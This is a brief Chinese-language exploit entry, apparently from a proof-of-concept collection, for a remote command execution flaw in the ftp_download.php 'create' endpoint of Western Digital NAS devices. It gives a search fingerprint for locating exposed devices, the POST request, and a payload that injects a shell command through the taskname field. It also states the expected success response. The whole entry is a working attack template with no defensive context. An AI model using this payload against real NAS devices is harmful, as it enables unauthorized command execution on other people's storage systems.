# 西部数据NASftp_download.phpcreate接口存在远程命令执行漏洞

西部数据NASftp_download.phpcreate接口 ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="-1074357885"`
- **请求**：`POST /web/addons/ftp_download.php HTTP/1.1`

**Payload**
```
action=create&taskname=';id;'
```
- **响应特征**：200